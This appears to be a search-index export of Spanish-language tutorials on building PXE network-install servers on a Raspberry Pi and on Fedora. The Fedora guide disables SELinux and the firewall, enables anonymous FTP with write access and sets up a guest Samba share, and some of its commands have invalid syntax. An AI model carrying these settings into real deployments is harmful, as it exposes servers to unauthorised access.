.168.4.240 ; option domain-name-servers 8 .8.8.8 ; option routers 192 .168.0.1 ; # router next-server 192 .168.4.103 ; # server filename \"pxelinux.0\" ; } Archivo de configuraci\u00f3n del servicio dhcp /etc/default/isc-dhcp-server INTERFACESv4 = \"eth0\" INTERFACESv6 = \"\" Creo estructura de carpetas que luego utilizare para organizar el archivos de inicio de isos sudo mkdir -p /var/lib/tftpboot/debian/stretch sudo mkdir -p /var/lib/tftpboot/windows Descargo archivo pxelinux.0 de arranque pxe de la web a /var/lib/tftpboot/ cd /var/lib/tftpboot/ sudo wget http://ftp.uk.debian.org/debian/dists/wheezy/main/installer-i386/current/images/netboot/debian-installer/i386/pxelinux.0 Configuraci\u00f3n inet.d /etc/inetd.conf tftp dgram udp wait root /usr/sbin/tcpd in .tftpd /var/lib/tftpboot Configuraci\u00f3n FTP /etc/default/tftpd-hfa TFTP_USERNAME = \"tftp\" TFTP_DIRECTORY = \"/var/lib/tftpboot\" TFTP_ADDRESS = \"0.0.0.0:69\" TFTP_OPTIONS = \"-s\" A\u00f1ado iso debian dentro de la carpeta debian creada. # descargo iso debian wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.2.1-amd64-netinst.iso # monto iso en /tmp/iso y lo copio a su carpeta correspondiente mkdir /tmp/iso # debian monto en /tmp/iso sudo mount -t iso9660 -o loop debian-9.2.1-amd64-netinst.iso /tmp/iso # copio en la carpeta del ftp para que pueda acceder desde pxe. sudo cp -arv /tmp/iso/* /var/lib/tftpboot/debian/stretch/ sudo umount /tmp/iso Creo men\u00fa de iniciaci\u00f3n pxe se encuentra dentro de la carpeta pxelinux.conf que creo a continuaci\u00f3n. sudo mkdir /var/lib/tftpboot/pxelinux.conf sudo touch /var/lib/tftpboot/pxelinux.conf/default # copio archivo que permite la visualizaci\u00f3n del men\u00fa sudo cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/ # a\u00f1ado foto de 640*480 sudo cp fondo.jpg /var/lib/tftpboot/pxelinux.conf/ /var/lib/tftpboot/pxelinux.conf/default ui vesamenu.c32 menu title Utilities menu background pxelinux.cfg/fondo.jpg label debian stretch menu label debian stretch # vmlinuz se encuentra dentro de la imagen de debian kernel debian/stretch/install.amd/vmlinuz # initrd.gz se encuentra dentro de la imagen de debian append vga = normal initrd = debian/stretch/install.amd/initrd.gz repo = ftp://192.168.4.103/debian/stretch PROMPT 1 TIMEOUT 0 Arrancar servicios sudo /etc/init.d/tftpd-hpa start sudo /etc/init.d/inetutils-inetd.service start sudo /etc/init.d/isc-dhcp-server start sudo systemctl enable isc-dhcp-server sudo systemctl enable inetutils-inetd.service Ya est\u00e1 operativo pxe con debian, seguimos con windows. Instalar samba con windows paquetes necesarios bash sudo apt-get install -y genisoimage wimtools cabextract samba ln -s /usr/bin/genisoimage /usr/bin/mkisofs Creamos los directorios mkdir -p /mnt/waik mkdir -p /var/lib/tftpboot/windows Descargamos Windows Automated Installation Kit (WAIK) ISO: wget https://download.microsoft.com/download/8/E/9/8E9BBC64-E6F8-457C-9B8D-F6C9A16E6D6A/KB3AIK_EN.iso Montamos la imagen mount KB3AIK_EN.iso /mnt/waik Generamos una imagen booteable mkwinpeimg --iso --arch = amd64 --waik-dir = /mnt/waik /var/lib/tftpboot/winpe.iso Desmontamos umount /mnt/waik Editamos el fichero de samba A\u00f1adimos lo siguiente al final /etc/samba/smb.conf [ windows ] browsable = true read only = yes guest ok = yes path = / var / lib / tftpboot / windows Descargamos un windows iso y montamos. sudo mount win10.iso /var/lib/tftpboot/windows Le a\u00f1adimos la siguiente linea a fstab para que monte autom\u00e1ticamente al arrancar /etc/fstab /home/pi/win10.iso /var/lib/tftpboot/windows auto loop 0 0 A\u00f1adimos lo necesario al men\u00fa del pxe para arrancar windows /var/lib/tftpboot/pxelinux.cfg/default: ui vesamenu.c32 menu title Utilities menu background pxelinux.cfg/fondo.jpg label debian stretch menu label debian stretch kernel debian/stretch/install.amd/vmlinuz append vga = normal initrd = debian/stretch/install.amd/initrd.gz repo = ftp://192.168.4.103/debian/stretch LABEL windows10 MENU LABEL Windows 10 KERNEL /memdisk INITRD /winpe.iso PROMPT 1 TIMEOUT 0 Al arrancar con pxe y seleccionando la imagen de windows se abre una terminal donde tenemos que acceder a samba. # Montar samba en z # net use Z: \\\\ipnuestra\\carpeta net use z: \\\\ 192 .168.4.103 \\w indows # acceder a z z: # acceder a carpeta windows donde esta la imagen de samba cd windows # ejecutar setup.exe de la iso setup.exe Y listo seguimos instalaci\u00f3n de windows.","title":"Servidor pxe con rapberry"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#servidor-pxe-con-rapberry","text":"Servidor pxe con rapberry Instalaci\u00f3n configurar dhcp Configuraci\u00f3n inet.d Configuraci\u00f3n FTP Creo men\u00fa de iniciaci\u00f3n pxe Instalar samba con windows paquetes necesarios 1-Que es PXE? Entorno de ejecuci\u00f3n de prearranque, es decir, un entorno para arrancar e instalar el sistema operativo en nodos a trav\u00e9s de la red. 2-Que hace? Permite conectarte autom\u00e1ticamente a un servidor donde puedes descargar e instalar el sistema operativo que tenga disponible el servidor. 3-Que necesita? Servidor DHCP (Red) Servidor FTP (ISOS) Men\u00fa de previsualizaci\u00f3n. 4-Como funciona? Almacena las im\u00e1genes en un servidor en el que accedes cuando te conectas por PXE mediante DHCP, y una vez conectado permite descargar e instalar dichas im\u00e1genes mediante un servidor ftp.","title":"Servidor pxe con rapberry"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#instalacion","text":"Raspberry pi 3b IP: 192.168.4.103 Mascara: 255.255.0.0 Broadcast: 192.168.255.255 Router: 192.168.0.1 Instalamos dhcp, inet utils y ftp sudo apt-get install -y isc-dhcp-server inetutils-inetd tftp tftpd-hpa","title":"Instalaci\u00f3n"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#configurar-dhcp","text":"/etc/dhcp/dhcpd.conf default-lease-time 600 ; max-lease-time 7200 ; ddns-update-style none ; authoritative ; allow booting ; allow bootp ; subnet 192 .168.4.0 netmask 255 .255.255.0 { option broadcast-address 192 .168.4.255 ; # broadcast range 192 .168.4.100 192 .168.4.240 ; option domain-name-servers 8 .8.8.8 ; option routers 192 .168.0.1 ; # router next-server 192 .168.4.103 ; # server filename \"pxelinux.0\" ; } Archivo de configuraci\u00f3n del servicio dhcp /etc/default/isc-dhcp-server INTERFACESv4 = \"eth0\" INTERFACESv6 = \"\" Creo estructura de carpetas que luego utilizare para organizar el archivos de inicio de isos sudo mkdir -p /var/lib/tftpboot/debian/stretch sudo mkdir -p /var/lib/tftpboot/windows Descargo archivo pxelinux.0 de arranque pxe de la web a /var/lib/tftpboot/ cd /var/lib/tftpboot/ sudo wget http://ftp.uk.debian.org/debian/dists/wheezy/main/installer-i386/current/images/netboot/debian-installer/i386/pxelinux.0","title":"configurar dhcp"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#configuracion-inetd","text":"/etc/inetd.conf tftp dgram udp wait root /usr/sbin/tcpd in .tftpd /var/lib/tftpboot","title":"Configuraci\u00f3n inet.d"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#configuracion-ftp","text":"/etc/default/tftpd-hfa TFTP_USERNAME = \"tftp\" TFTP_DIRECTORY = \"/var/lib/tftpboot\" TFTP_ADDRESS = \"0.0.0.0:69\" TFTP_OPTIONS = \"-s\" A\u00f1ado iso debian dentro de la carpeta debian creada. # descargo iso debian wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.2.1-amd64-netinst.iso # monto iso en /tmp/iso y lo copio a su carpeta correspondiente mkdir /tmp/iso # debian monto en /tmp/iso sudo mount -t iso9660 -o loop debian-9.2.1-amd64-netinst.iso /tmp/iso # copio en la carpeta del ftp para que pueda acceder desde pxe. sudo cp -arv /tmp/iso/* /var/lib/tftpboot/debian/stretch/ sudo umount /tmp/iso","title":"Configuraci\u00f3n FTP"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#creo-menu-de-iniciacion-pxe","text":"se encuentra dentro de la carpeta pxelinux.conf que creo a continuaci\u00f3n. sudo mkdir /var/lib/tftpboot/pxelinux.conf sudo touch /var/lib/tftpboot/pxelinux.conf/default # copio archivo que permite la visualizaci\u00f3n del men\u00fa sudo cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/ # a\u00f1ado foto de 640*480 sudo cp fondo.jpg /var/lib/tftpboot/pxelinux.conf/ /var/lib/tftpboot/pxelinux.conf/default ui vesamenu.c32 menu title Utilities menu background pxelinux.cfg/fondo.jpg label debian stretch menu label debian stretch # vmlinuz se encuentra dentro de la imagen de debian kernel debian/stretch/install.amd/vmlinuz # initrd.gz se encuentra dentro de la imagen de debian append vga = normal initrd = debian/stretch/install.amd/initrd.gz repo = ftp://192.168.4.103/debian/stretch PROMPT 1 TIMEOUT 0 Arrancar servicios sudo /etc/init.d/tftpd-hpa start sudo /etc/init.d/inetutils-inetd.service start sudo /etc/init.d/isc-dhcp-server start sudo systemctl enable isc-dhcp-server sudo systemctl enable inetutils-inetd.service Ya est\u00e1 operativo pxe con debian, seguimos con windows.","title":"Creo men\u00fa de iniciaci\u00f3n pxe"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/#instalar-samba-con-windows-paquetes-necesarios","text":"bash sudo apt-get install -y genisoimage wimtools cabextract samba ln -s /usr/bin/genisoimage /usr/bin/mkisofs Creamos los directorios mkdir -p /mnt/waik mkdir -p /var/lib/tftpboot/windows Descargamos Windows Automated Installation Kit (WAIK) ISO: wget https://download.microsoft.com/download/8/E/9/8E9BBC64-E6F8-457C-9B8D-F6C9A16E6D6A/KB3AIK_EN.iso Montamos la imagen mount KB3AIK_EN.iso /mnt/waik Generamos una imagen booteable mkwinpeimg --iso --arch = amd64 --waik-dir = /mnt/waik /var/lib/tftpboot/winpe.iso Desmontamos umount /mnt/waik Editamos el fichero de samba A\u00f1adimos lo siguiente al final /etc/samba/smb.conf [ windows ] browsable = true read only = yes guest ok = yes path = / var / lib / tftpboot / windows Descargamos un windows iso y montamos. sudo mount win10.iso /var/lib/tftpboot/windows Le a\u00f1adimos la siguiente linea a fstab para que monte autom\u00e1ticamente al arrancar /etc/fstab /home/pi/win10.iso /var/lib/tftpboot/windows auto loop 0 0 A\u00f1adimos lo necesario al men\u00fa del pxe para arrancar windows /var/lib/tftpboot/pxelinux.cfg/default: ui vesamenu.c32 menu title Utilities menu background pxelinux.cfg/fondo.jpg label debian stretch menu label debian stretch kernel debian/stretch/install.amd/vmlinuz append vga = normal initrd = debian/stretch/install.amd/initrd.gz repo = ftp://192.168.4.103/debian/stretch LABEL windows10 MENU LABEL Windows 10 KERNEL /memdisk INITRD /winpe.iso PROMPT 1 TIMEOUT 0 Al arrancar con pxe y seleccionando la imagen de windows se abre una terminal donde tenemos que acceder a samba. # Montar samba en z # net use Z: \\\\ipnuestra\\carpeta net use z: \\\\ 192 .168.4.103 \\w indows # acceder a z z: # acceder a carpeta windows donde esta la imagen de samba cd windows # ejecutar setup.exe de la iso setup.exe Y listo seguimos instalaci\u00f3n de windows.","title":"Instalar samba con windows paquetes necesarios"},{"location":"administracion/pxe/guiapxe-fedora/","text":"Instalar y configurar servidor pxe Instalar y configurar servidor pxe descargamos bind(dhcp) vsftp y selinux Configurar dhcp configuraci\u00f3n de ftp Configurar menu de arranque A\u00f1adir los estilos al menu. A\u00f1ado entradas al menu A\u00f1adir distribuciones Descargar abrir y guardar Ordenar tftpboot Editar menu.cfg Ejemplo imagen descargamos bind(dhcp) vsftp y selinux Datos de mi red cambiar seg\u00fan se tenga cada uno. 192.168.88.243 server 192.168.88.1 router 192.168.88.0 red Para que los clientes se conecten via pxe hay que desabilitar selinux y firtewall. systemctl stop/disable selinux systemctl stop/disable firewall Configurar dhcp root@fedora26-virt ~]# cat /etc/dhcp/dhcpd.conf ddns-update-style none; default-lease-time 3600; max-lease-time 86400; allow booting; allow bootp; subnet 192.168.88.0 netmask 255.255.255.0 { option broadcast-address 192.168.88.255; # broadcas range 192.168.88.200 192.168.88.240; option domain-name-servers 8.8.8.8; option routers 192.168.88.1; # router next-server 192.168.88.243; # server filename \"pxelinux.0\"; } En el recuadro superior tenemos una configuraci\u00f3n que solo manda direcciones ip al arrancar. El archivo pxelinux.0 luego lo extraeremos de /usr/share/syslinux/ es el arranque del menu syslinux. configuraci\u00f3n de ftp [root@fedora26-virt ~]# cat /etc/xinetd.d/tftp # default: off # description: The tftp server serves files using the trivial file transfer # protocol. The tftp protocol is often used to boot diskless # workstations, download configuration files to network-aware printers, # and to start the installation process for some operating systems. service tftp { socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot disable = no per_source = 11 cps = 100 2 flags = IPv4 } En este archivo lo importante es la ruta en la que pondremos el tftpboot que es donde estara el menu de arranque consus archivos. [root@fedora26-virt ~]# cat /etc/vsftpd/vsftpd.conf anonymous_enable=YES local_enable=YES write_enable=YES local_umask=022 dirmessage_enable=YES xferlog_enable=YES connect_from_port_20=YES xferlog_std_format=YES listen=YES pam_service_name=vsftpd userlist_enable=NO tcp_wrappers=YES seccomp_sandbox=NO por defecto anonymous_enable= viene en no lo cambiamos a yes, para que puedan acceder al server ftp cualquier usuario. Configurar menu de arranque Ahora tenemos que a\u00f1adir el menu de arranque a tftpboot. sudo cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/ sudo cp /usr/share/syslinux/ldlinux.c32 /var/lib/tftpboot/ pxelinux.0 es el ejecutable de syslinux, ldlinux.c32 una libreria sulla que pide. pxelinux.0 necesita una configuraci\u00f3n para ser visto y por defecto la coge de pxelinux.cfg/default que crearemos ahora. sudo mkdir /var/lib/tftpboot/pxelinux.cfg sudo touch /var/lib/tftpboot/pxelinux.cfg/default sudo cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/pxelinux.cfg/ tambi\u00e9n a\u00f1adimos vesamenu.32 es un tipo de visualizacion del menu. A\u00f1adimos al archivo default las siguientes lineas: [root@fedora26-virt ~]# cat /var/lib/tftpboot/pxelinux.cfg/default # D-I config version 2.0 # ruta donde a\u00f1adire mi menu path mi-menu/ # menu de configuraci\u00f3n include mi-menu/menu.cfg # tipo de visualizador default vesamenu.c32 prompt 0 timeout 0 En mi caso he separado este anchivo en 3 distintos: default los estilos definidos que quiero que se vea stylosmenu.cfg menu de opciones menu.cfg no es necesario pero si mas lejible en futuras ocasiones. creo ruta a mi menu.cfg y copio algunos archivos que necesitare: cd /var/lib/tftpboot mkdir mi-menu touch mi-menu/menu.cfg touch mi-menu/stylosmenu.cfg sudo cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/reboot.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/ldlinux.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/libcom32.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/libutil.c32 /var/lib/tftpboot/mi-menu/ sudo cp /home/mi-user/images/fondo.jpg /var/lib/tftpboot/mi-menu/ Importante la imagen de fondo a de ser de 640x480 y en formato .jpg o .png Si no quieres imagen de fondo omitirla A\u00f1adir los estilos al menu. [root@fedora26-virt ~]# cat /var/lib/tftpboot/mi-menu/stylosmenu.cfg menu background mi-menu/fondo.jpg menu color title * #FFFFFFFF * menu color border * #00000000 #00000000 none menu color sel * #ffffffff #76a1d0ff * menu color hotsel 1 ; 7 ; 37 ; 40 #ffffffff #76a1d0ff * menu color tabmsg * #ffffffff #00000000 * menu color help 37 ; 40 #ffdddd00 #00000000 none # XXX When adjusting vshift, take care that rows is set to a small # enough value so any possible menu will fit on the screen, # rather than falling off the bottom. menu vshift 8 menu rows 12 # The help line must be at least one line from the bottom. menu helpmsgrow 14 # The command line must be at least one line from the help line. menu cmdlinerow 16 menu timeoutrow 16 menu tabmsgrow 18 menu tabmsg Press ENTER to boot or TAB to edit a menu entry Es la configuraci\u00f3n que usa la live de debian por defecto. A\u00f1ado entradas al menu [root@fedora26-virt ~]# cat /var/lib/tftpboot/mi-menu/menu.cfg menu hshift 7 menu width 61 # include define fondo y posicionamieto de menu para reducir l\u00edneas include mi-menu/stylosmenu.cfg menu title Menu PXE rompe pelotas label Arrancar de disco LOCALBOOT 0 TEXT HELP Para arrancar desde el disco duro pulsa Enter. ENDTEXT label Reiniciar menu label ^Reiniciar COM32 reboot.c32 de momento con esto ya deberia servir pasra arrancar y comprobar que funciona. Iniciamos servicios dhcpd y vsftpd y comprobamos. sudo systemctl start/enable dhcpd sudo systemctl start/enable vsftpd E iniciamos desde otra m\u00e1quina mediante pxe y en la misma red. A\u00f1adir distribuciones Descargar abrir y guardar Para a\u00f1adir isos tendremos que descargarlas de sus repositorios y guardarlas en /var/ftp/pub a\u00f1adiremos 3 distribuciones, debian, centos y fedora. # creo carpetas donde las guardare sudo mkdir /var/ftp/pub/debian9-x86_64 sudo mkdir /var/ftp/pub/centos7-x86_64 sudo mkdir /var/ftp/pub/fedora27-x86_64 # descargo isos wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.2.1-amd64-netinst.iso wget http://ftp.cixug.es/CentOS/7/isos/x86_64/CentOS-7-x86_64-Minimal-1708.iso wget https://download.fedoraproject.org/pub/fedora/linux/releases/27/Workstation/x86_64/iso/Fedora-Workstation-netinst-x86_64-27-1.6.iso # monto iso en /tmp/iso y lo copio a su carpeta correspondiente mkdir /tmp/iso # debian sudo mount -t iso9660 -o loop debian-9.2.1-amd64-netinst.iso /tmp/iso sudo cp -arv /tmp/iso/* /var/ftp/pub/debian9-x86_64/ sudo umount /tmp/iso # centos sudo mount -t iso9660 -o loop CentOS-7-x86_64-Minimal-1708.iso /tmp/iso sudo cp -arv /tmp/iso/* /var/ftp/pub/centos7-x86_64/ sudo umount /tmp/iso # fedora sudo mount -t iso9660 -o loop Fedora-Workstation-netinst-x86_64-27-1.6.iso /tmp/iso sudo cp -arv /tmp/iso/* /var/ftp/pub/fedora27-x86_64/ sudo umount /tmp/iso # borro isos descargadas para liberar espacio rm Fedora-Workstation-netinst-x86_64-27-1.6.iso rm CentOS-7-x86_64-Minimal-1708.iso rm debian-9.2.1-amd64-netinst.iso Ordenar tftpboot Ya con la isos guardadas procedemos a estructurar nuestra carpeta tftpboot, por que tendremos que extraer de cada iso su archivo de iniciaci\u00f3n y el kernel que usan. En el caso de fedora y centos initrd.img y vmlinuz. En debian initrd.gz y vmlinuz. Creo una carpeta para cada distro y dentro su version, para futuras ampliaciones. cd /var/lib/tftpboot mkdir -p /centos/centos7 mkdir -p /debian/stretch mkdir -p /fedora/fedora27 Y de cada uno le a\u00f1adimos su archivo de kernerl e iniciaci\u00f3n cp /var/ftp/pub/centos7-x86_64/isolinux/vmlinuz centos/centos7/ cp /var/ftp/pub/centos7-x86_64/isolinux/initrd.img centos/centos7/ cp /var/ftp/pub/fedora27-x86_64/isolinux/vmlinuz fedora/fedora27/ cp /var/ftp/pub/fedora27-x86_64/isolinux/initrd.img fedora/fedora27/ cp /var/ftp/pub/debian9-x86_64/install.amd/vmlinuz debian/stretch/ cp /var/ftp/pub/debian9-x86_64/install.amd/initrd.gz debian/stretch/ nos quedara el siguente arbol en la carpeta tftpboot [ root@fedora26-virt tftpboot ] # tree . \u251c\u2500\u2500 centos \u2502 \u2514\u2500\u2500 centos7 \u2502 \u251c\u2500\u2500 initrd.img \u2502 \u2514\u2500\u2500 vmlinuz \u251c\u2500\u2500 debian \u2502 \u2514\u2500\u2500 stretch \u2502 \u251c\u2500\u2500 initrd.gz \u2502 \u2514\u2500\u2500 vmlinuz \u251c\u2500\u2500 fedora \u2502 \u2514\u2500\u2500 fedora27 \u2502 \u251c\u2500\u2500 initrd.img \u2502 \u2514\u2500\u2500 vmlinuz \u251c\u2500\u2500 ldlinux.c32 \u251c\u2500\u2500 mi-menu \u2502 \u251c\u2500\u2500 fondo.jpg \u2502 \u251c\u2500\u2500 ldlinux.c32 \u2502 \u251c\u2500\u2500 libcom32.c32 \u2502 \u251c\u2500\u2500 libutil.c32 \u2502 \u251c\u2500\u2500 menu.cfg \u2502 \u251c\u2500\u2500 reboot.c32 \u2502 \u251c\u2500\u2500 stylosmenu.cfg \u2502 \u2514\u2500\u2500 vesamenu.c32 \u251c\u2500\u2500 pxelinux.0 \u2514\u2500\u2500 pxelinux.cfg \u251c\u2500\u2500 default \u2514\u2500\u2500 vesamenu.c32 Editar menu.cfg Ahora que ya tenemos todo ordenado y preparado. Editamos el menu.cfg y a\u00f1adimos las siguientes l\u00edneas: [root@fedora26-virt ~]# cat /var/lib/tftpboot/mi-menu/menu.cfg menu hshift 7 menu width 61 # include define fondo y posicionamieto de menu para reducir l\u00edneas include mi-menu/stylosmenu.cfg menu title Menu PXE rompe pelotas label Arrancar de disco LOCALBOOT 0 TEXT HELP Para arrancar desde el disco duro pulsa Enter. ENDTEXT label Reiniciar menu label ^Reiniciar COM32 reboot.c32 #submenu isos menu begin Imagenes menu label ^Imagenes menu title Imagenes # al ser un submenu hay que poner fondo otra vez y cuadrar texto include mi-menu/stylosmenu.cfg label mainmenu menu label ^Back.. menu exit label Fedora 27 menu label ^Fedora 27 kernel fedora/fedora27/vmlinuz append initrd = fedora/fedora27/initrd.img repo = ftp://192.168.88.243/pub/fedora27-x86_64 label Debian strech menu label ^Debian strech kernel debian/stretch/vmlinuz append initrd = debian/stretch/initrd.gz repo = ftp://192.168.88.243/pub/debian9-x86_64 label Centos 7 menu label ^Centos 7 kernel centos/centos7/vmlinuz append initrd = centos/centos7/initrd.img repo = ftp://192.168.88.243/pub/centos7-x86_64 menu end # fin submenu Con las siguientes l\u00edneas le decimos que inicie con el kernel de linux, inicie la imagen y coja las dependencias de nuestro repositorio ftp. Todo esto hay que tener en cuenta que hemos creado un server ftp con poca seguridad si ponems en el navegador ftp://192.168.88.243 en nmi caso saldra el contenido de la carpeta pub. En entornos lan privados no pasa nada, pero es un dato a tener en cuenta. \u00a1Importante! A mas a mas Fedora tiene un bug que si arrancas con una m\u00e1quina con 1G de ram falla la instalacio\u00f3n , m\u00ednimo a de tener 2G para que funcione bien. Ejemplo imagen Dejo un par de imagenes para ver como queda.","title":"Guiapxe fedora"},{"location":"administracion/pxe/guiapxe-fedora/#instalar-y-configurar-servidor-pxe","text":"Instalar y configurar servidor pxe descargamos bind(dhcp) vsftp y selinux Configurar dhcp configuraci\u00f3n de ftp Configurar menu de arranque A\u00f1adir los estilos al menu. A\u00f1ado entradas al menu A\u00f1adir distribuciones Descargar abrir y guardar Ordenar tftpboot Editar menu.cfg Ejemplo imagen","title":"Instalar y configurar servidor pxe"},{"location":"administracion/pxe/guiapxe-fedora/#descargamos-binddhcp-vsftp-y-selinux","text":"Datos de mi red cambiar seg\u00fan se tenga cada uno. 192.168.88.243 server 192.168.88.1 router 192.168.88.0 red Para que los clientes se conecten via pxe hay que desabilitar selinux y firtewall. systemctl stop/disable selinux systemctl stop/disable firewall","title":"descargamos bind(dhcp) vsftp y selinux"},{"location":"administracion/pxe/guiapxe-fedora/#configurar-dhcp","text":"root@fedora26-virt ~]# cat /etc/dhcp/dhcpd.conf ddns-update-style none; default-lease-time 3600; max-lease-time 86400; allow booting; allow bootp; subnet 192.168.88.0 netmask 255.255.255.0 { option broadcast-address 192.168.88.255; # broadcas range 192.168.88.200 192.168.88.240; option domain-name-servers 8.8.8.8; option routers 192.168.88.1; # router next-server 192.168.88.243; # server filename \"pxelinux.0\"; } En el recuadro superior tenemos una configuraci\u00f3n que solo manda direcciones ip al arrancar. El archivo pxelinux.0 luego lo extraeremos de /usr/share/syslinux/ es el arranque del menu syslinux.","title":"Configurar dhcp"},{"location":"administracion/pxe/guiapxe-fedora/#configuracion-de-ftp","text":"[root@fedora26-virt ~]# cat /etc/xinetd.d/tftp # default: off # description: The tftp server serves files using the trivial file transfer # protocol. The tftp protocol is often used to boot diskless # workstations, download configuration files to network-aware printers, # and to start the installation process for some operating systems. service tftp { socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot disable = no per_source = 11 cps = 100 2 flags = IPv4 } En este archivo lo importante es la ruta en la que pondremos el tftpboot que es donde estara el menu de arranque consus archivos. [root@fedora26-virt ~]# cat /etc/vsftpd/vsftpd.conf anonymous_enable=YES local_enable=YES write_enable=YES local_umask=022 dirmessage_enable=YES xferlog_enable=YES connect_from_port_20=YES xferlog_std_format=YES listen=YES pam_service_name=vsftpd userlist_enable=NO tcp_wrappers=YES seccomp_sandbox=NO por defecto anonymous_enable= viene en no lo cambiamos a yes, para que puedan acceder al server ftp cualquier usuario.","title":"configuraci\u00f3n de ftp"},{"location":"administracion/pxe/guiapxe-fedora/#configurar-menu-de-arranque","text":"Ahora tenemos que a\u00f1adir el menu de arranque a tftpboot. sudo cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/ sudo cp /usr/share/syslinux/ldlinux.c32 /var/lib/tftpboot/ pxelinux.0 es el ejecutable de syslinux, ldlinux.c32 una libreria sulla que pide. pxelinux.0 necesita una configuraci\u00f3n para ser visto y por defecto la coge de pxelinux.cfg/default que crearemos ahora. sudo mkdir /var/lib/tftpboot/pxelinux.cfg sudo touch /var/lib/tftpboot/pxelinux.cfg/default sudo cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/pxelinux.cfg/ tambi\u00e9n a\u00f1adimos vesamenu.32 es un tipo de visualizacion del menu. A\u00f1adimos al archivo default las siguientes lineas: [root@fedora26-virt ~]# cat /var/lib/tftpboot/pxelinux.cfg/default # D-I config version 2.0 # ruta donde a\u00f1adire mi menu path mi-menu/ # menu de configuraci\u00f3n include mi-menu/menu.cfg # tipo de visualizador default vesamenu.c32 prompt 0 timeout 0 En mi caso he separado este anchivo en 3 distintos: default los estilos definidos que quiero que se vea stylosmenu.cfg menu de opciones menu.cfg no es necesario pero si mas lejible en futuras ocasiones. creo ruta a mi menu.cfg y copio algunos archivos que necesitare: cd /var/lib/tftpboot mkdir mi-menu touch mi-menu/menu.cfg touch mi-menu/stylosmenu.cfg sudo cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/reboot.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/ldlinux.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/libcom32.c32 /var/lib/tftpboot/mi-menu/ sudo cp /usr/share/syslinux/libutil.c32 /var/lib/tftpboot/mi-menu/ sudo cp /home/mi-user/images/fondo.jpg /var/lib/tftpboot/mi-menu/ Importante la imagen de fondo a de ser de 640x480 y en formato .jpg o .png Si no quieres imagen de fondo omitirla","title":"Configurar menu de arranque"},{"location":"administracion/pxe/guiapxe-fedora/#anadir-los-estilos-al-menu","text":"[root@fedora26-virt ~]# cat /var/lib/tftpboot/mi-menu/stylosmenu.cfg menu background mi-menu/fondo.jpg menu color title * #FFFFFFFF * menu color border * #00000000 #00000000 none menu color sel * #ffffffff #76a1d0ff * menu color hotsel 1 ; 7 ; 37 ; 40 #ffffffff #76a1d0ff * menu color tabmsg * #ffffffff #00000000 * menu color help 37 ; 40 #ffdddd00 #00000000 none # XXX When adjusting vshift, take care that rows is set to a small # enough value so any possible menu will fit on the screen, # rather than falling off the bottom. menu vshift 8 menu rows 12 # The help line must be at least one line from the bottom. menu helpmsgrow 14 # The command line must be at least one line from the help line. menu cmdlinerow 16 menu timeoutrow 16 menu tabmsgrow 18 menu tabmsg Press ENTER to boot or TAB to edit a menu entry Es la configuraci\u00f3n que usa la live de debian por defecto.","title":"A\u00f1adir los estilos al menu."},{"location":"administracion/pxe/guiapxe-fedora/#anado-entradas-al-menu","text":"[root@fedora26-virt ~]# cat /var/lib/tftpboot/mi-menu/menu.cfg menu hshift 7 menu width 61 # include define fondo y posicionamieto de menu para reducir l\u00edneas include mi-menu/stylosmenu.cfg menu title Menu PXE rompe pelotas label Arrancar de disco LOCALBOOT 0 TEXT HELP Para arrancar desde el disco duro pulsa Enter. ENDTEXT label Reiniciar menu label ^Reiniciar COM32 reboot.c32 de momento con esto ya deberia servir pasra arrancar y comprobar que funciona. Iniciamos servicios dhcpd y vsftpd y comprobamos. sudo systemctl start/enable dhcpd sudo systemctl start/enable vsftpd E iniciamos desde otra m\u00e1quina mediante pxe y en la misma red.","title":"A\u00f1ado entradas al menu"},{"location":"administracion/pxe/guiapxe-fedora/#anadir-distribuciones","text":"","title":"A\u00f1adir distribuciones"},{"location":"administracion/pxe/guiapxe-fedora/#descargar-abrir-y-guardar","text":"Para a\u00f1adir isos tendremos que descargarlas de sus repositorios y guardarlas en /var/ftp/pub a\u00f1adiremos 3 distribuciones, debian, centos y fedora. # creo carpetas donde las guardare sudo mkdir /var/ftp/pub/debian9-x86_64 sudo mkdir /var/ftp/pub/centos7-x86_64 sudo mkdir /var/ftp/pub/fedora27-x86_64 # descargo isos wget https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.2.1-amd64-netinst.iso wget http://ftp.cixug.es/CentOS/7/isos/x86_64/CentOS-7-x86_64-Minimal-1708.iso wget https://download.fedoraproject.org/pub/fedora/linux/releases/27/Workstation/x86_64/iso/Fedora-Workstation-netinst-x86_64-27-1.6.iso # monto iso en /tmp/iso y lo copio a su carpeta correspondiente mkdir /tmp/iso # debian sudo mount -t iso9660 -o loop debian-9.2.1-amd64-netinst.iso /tmp/iso sudo cp -arv /tmp/iso/* /var/ftp/pub/debian9-x86_64/ sudo umount /tmp/iso # centos sudo mount -t iso9660 -o loop CentOS-7-x86_64-Minimal-1708.iso /tmp/iso sudo cp -arv /tmp/iso/* 